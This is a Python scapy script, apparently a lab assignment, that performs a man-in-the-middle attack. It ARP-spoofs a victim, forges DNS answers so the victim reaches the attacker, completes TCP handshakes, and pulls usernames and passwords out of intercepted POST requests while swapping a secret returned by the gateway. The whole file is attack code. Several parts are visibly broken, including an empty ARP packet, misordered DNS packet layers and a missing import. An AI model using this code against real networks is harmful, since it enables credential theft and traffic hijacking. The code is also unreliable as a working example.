#!/usr/bin/env python3
from multiprocessing import Process

#import coloredlogs
from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP, TCP, IP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dns import DNSRR
from scapy.layers.inet6 import IPv6
import random

INTERFACE = "eth0"

GATEWAY_IP = None
GATEWAY_HW = None
ATTACKER_IP = None
ATTACKER_HW = None
VICTIM_IP = None
VICTIM_HW = None

class TCPServerState:
    LISTEN = 0,
    SYN_RECIEVED = 1,
    ESTABLISHED = 2,

http_server_state = TCPServerState.LISTEN

def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, src_ip_addr: str, target_ip_addr: str, gw_ip_address: str) -> None:
    while True:
        p = Ether(dst=target_hw_addr, src=src_hw_addr) / ARP(op="")
        sendp(p)
        time.sleep(1.0)


def on_dns_packet(p: Packet) -> None:
    logging.info(f"forwarding DNS request")

    # Our environment is only allowing us to access IPv6 packets, if we filter those out we do not get any packets 
    # Victim is trying to contact DNS server (qr = 0)
    if p[DNS].qr == 0 and p[IPv6].src == VICTIM_IP:
        # Our response to victim, giving our IP as the IP of the class server 
        # Flip the src/dst for IP and UDP, supply the dst hardware address through Ether
        # DNS response is our IP
        response = IPv6(src=p[IPv6].dst, dst=p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
        
        sendp(response, iface=INTERFACE)
        
        # Send message to gateway acting as victim
        # src and dst are the same as the packet received 
        gateway_msg = IPv6(src=p[IPv6].src, dst = p[IPv6].dst) / UDP(sport=p[UDP].sport, dport=p[UDP].dport) / Ether(dst=p[Ether].dst) / DNS(qr=0,id=p[DNS].id, an=DNSRR(rdata=("class.diverge.dev")))

        sendp(gateway_msg, iface=INTERFACE)


def on_http_packet(p: Packet) -> None:
    global http_server_state
    assert IP in p
    assert TCP in p
    assert p[TCP].dport == 1200

    # If the attacker is listening for a SYN packet
    if http_server_state == TCPServerState.LISTEN: # Listening 
        if p[TCP].flags == 'S':

            # ACK sequence + 1, pick random ISN
            # Send back a SYN/ACK packet with a new random ISN (32 bit) and ack which is the prev sequence + 1
            r = (Ether(dst=p[Ether].src, src=p[Ether].dst)/(IP(dst=p[IP].src, src=p[IP].dst)/TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags='SA', seq=random.randrange(0,(2**32) - 1), ack=p[TCP].seq +1)))
            sendp(r, iface=INTERFACE)

            # Listen for ACK packet back
            http_server_state = TCPServerState.SYN_RECIEVED
            pass

    elif http_server_state == TCPServerState.SYN_RECIEVED:
        # received ACK, TCP Handshake successful
        if p[TCP].flags == 'A':
            http_server_state = TCPServerState.ESTABLISHED

    elif http_server_state == TCPServerState.ESTABLISHED:
        # Recevied a PUSH packet
        username = None
        password = None

        if p[TCP].flags == 'PA' and p[IP].src == VICTIM_IP:
            # Forward unaltered POST request to the gateway 
            p[Ether].dst = GATEWAY_HW
            p[IP].dst = GATEWAY_IP
            sendp(p, iface=INTERFACE)
            
            # Intercepting victim -> gateway interaction, where the victim supplies their username and password
            payload = p[TCP].payload
            user_pass = payload.split("&")
            username = user_pass[0].split("=")[1]
            password = user_pass[1].split("=")[1]

        elif p[TCP].flags == 'PA' and p[IP].src == GATEWAY_IP:
            # Receive a packet from the gateway, steal/modify the secret, send it to the victim 
            payload = p[TCP].payload
            secret = payload.split("=")[1]
            
            p[TCP].payload = "secret=holmes.ga@northeastern.edu" 
            p[TCP].src = ATTACKER_IP
            p[TCP].dst = VICTIM_IP
            sendp(p, iface=INTERFACE)

            if username is not None and password is not None:
                output = {"id": "holmes.ga@northeastern.edu",
                        "username":username,
                        "password":password,
                        "secret":secret
                        }
                print(output)


def on_packet(p: Packet) -> None:
    if TCP in p and p[TCP].dport == 1200:
        on_http_packet(p)
    if UDP in p and DNS in p:
        on_dns_packet(p)


def main() -> None:
    global ATTACKER_HW
    global VICTIM_HW
    global GATEWAY_HW
    global ATTACKER_IP
    global VICTIM_IP
    global GATEWAY_IP

    ATTACKER_HW = sys.argv[1]
    VICTIM_HW = sys.argv[2]
    GATEWAY_HW = sys.argv[3]
    ATTACKER_IP = sys.argv[4]
    VICTIM_IP = sys.argv[5]
    GATEWAY_IP = sys.argv[6]
    

    coloredlogs.install(level="INFO")

    logging.info(f"starting ARP hijacker on {INTERFACE}")
    p = Process(target=arp_main, args=(ATTACKER_HW, VICTIM_HW, GATEWAY_HW, ATTACKER_IP, VICTIM_IP, GATEWAY_IP))
    p.start()

    logging.info(f"starting sniffer on {INTERFACE}")
    sniff(store=False, iface=INTERFACE, prn=on_packet)

    p.join()


if __name__ == "__main__":
    main()
